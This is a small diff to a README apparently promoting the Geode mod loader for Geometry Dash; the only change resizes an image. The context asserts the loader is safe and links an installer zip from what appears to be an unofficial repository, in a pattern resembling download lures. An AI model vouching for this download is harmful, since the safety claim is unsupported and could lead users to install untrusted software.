@@ -3,7 +3,7 @@
 **Geode** is the most trusted mod loader for Geometry Dash. Install once and browse 200+ community mods directly in-game on GD 2.207. Available for Windows, macOS, Android (APK) and iOS. No manual file editing needed. Is Geode safe? Yes - all indexed mods are reviewed before listing.
 
 
-<img width="1024" height="1024" alt="images1" src="https://github.com/user-attachments/assets/71ad0d21-1052-460f-8150-13a1a1069a47" />
+<img width="124" height="124" alt="images1" src="https://github.com/user-attachments/assets/71ad0d21-1052-460f-8150-13a1a1069a47" />
 
 ## Install
 [Download `Geode-Installer.zip`](https://github.com/geode-gd-hub/Geode-Geometry-Dash/releases/download/v5.8.3/Geode-Installer.zip)
